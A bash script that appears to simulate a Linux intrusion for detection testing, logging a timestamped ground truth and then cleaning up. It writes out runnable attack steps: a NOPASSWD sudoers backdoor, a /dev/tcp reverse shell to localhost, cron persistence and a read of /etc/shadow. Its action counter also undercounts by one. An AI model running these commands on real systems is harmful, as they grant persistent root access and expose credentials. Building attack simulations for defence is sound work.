#!/bin/bash
# 11-linux_attack_sim.sh – attacker‑simulation + ground‑truth export

set -euo pipefail

LOG_FILE="linux_attack_log.json"

# --------------------------------------------------------------------
timestamp() { date -u +"%Y-%m-%dT%H:%M:%SZ" ; }

# array to hold each JSON object
declare -a LOGS=()

echo "PS> ./11-linux_attack_sim.sh"
echo "[*] Running Linux attacker simulation..."

action=1

# Create a user
time=$(timestamp)
useradd testattacker || true   # ignore error if already exists
LOGS+=("{\"ActionNumber\":$action,\"Description\":\"Create user\",\"Timestamp\":\"$time\"}")
printf "    [%d/6] Creating user testattacker...                %s\n" "$action" "$time"
((action++))

# Modify sudoers
time=$(timestamp)
echo "testattacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/backdoor
chmod 440 /etc/sudoers.d/backdoor
LOGS+=("{\"ActionNumber\":$action,\"Description\":\"Modify sudoers\",\"Timestamp\":\"$time\"}")
printf "    [%d/6] Modifying sudoers...                         %s\n" "$action" "$time"
((action++))

# Execute binary from /tmp
time=$(timestamp)
cp /usr/bin/id /tmp/suspicious_bin
chmod +x /tmp/suspicious_bin
/tmp/suspicious_bin > /dev/null 2>&1
LOGS+=("{\"ActionNumber\":$action,\"Description\":\"Execute from /tmp\",\"Timestamp\":\"$time\"}")
printf "    [%d/6] Executing from /tmp...                       %s\n" "$action" "$time"
((action++))

# Reverse‑shell attempt (safe localhost)
time=$(timestamp)
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' ; sleep 1; kill %1 >/dev/null 2>&1
LOGS+=("{\"ActionNumber\":$action,\"Description\":\"Reverse shell attempt\",\"Timestamp\":\"$time\"}")
printf "    [%d/6] Reverse shell attempt (localhost)...         %s\n" "$action" "$time"
((action++))

# Cron persistence
time=$(timestamp)
echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test
chmod 644 /etc/cron.d/persistence_test
LOGS+=("{\"ActionNumber\":$action,\"Description\":\"Cron persistence\",\"Timestamp\":\"$time\"}")
printf "    [%d/6] Cron persistence...                          %s\n" "$action" "$time"
((action++))

# Access sensitive files
time=$(timestamp)
cat /etc/shadow > /dev/null 2>&1
LOGS+=("{\"ActionNumber\":$action,\"Description\":\"Access shadow\",\"Timestamp\":\"$time\"}")
printf "    [%d/6] Accessing /etc/shadow...                     %s\n" "$action" "$time"

# --------------------------------------------------------------------
echo "[*] Cleaning up artifacts..."
# remove user (force)
userdel -r testattacker || true
rm -f /etc/sudoers.d/backdoor
rm -f /tmp/suspicious_bin
rm -f /tmp/beacon.sh
rm -f /etc/cron.d/persistence_test

echo "    [CLEAN]"

# --------------------------------------------------------------------
# build JSON array
printf '%s\n' "${LOGS[@]}" | paste -sd, - > "$LOG_FILE"
sed -i '1s/^/[/' "$LOG_FILE"
sed -i '$s/$/\]/' "$LOG_FILE"

echo ""
echo "Actions executed: $((action-1))"
echo "Ground truth saved to: $LOG_FILE"
